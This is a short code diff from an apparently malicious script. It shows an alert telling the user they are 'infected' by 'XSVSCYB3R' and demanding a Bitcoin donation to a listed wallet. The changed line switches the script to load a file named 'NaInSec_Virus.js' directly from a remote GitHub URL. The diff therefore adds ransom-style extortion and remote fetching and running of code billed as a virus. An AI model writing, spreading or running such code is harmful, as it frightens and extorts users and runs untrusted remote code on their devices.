@@ -33,4 +33,4 @@ $store.keys()
 })(50); 
 
 $alert('WARNING YOU HAVE BEEN INFECTED BY XSVSCYB3R. Please Donate BTC : 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5')
-$loader.script("NaInSec_Virus.js")
+$loader.script("https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/NaInSec_Virus.js")
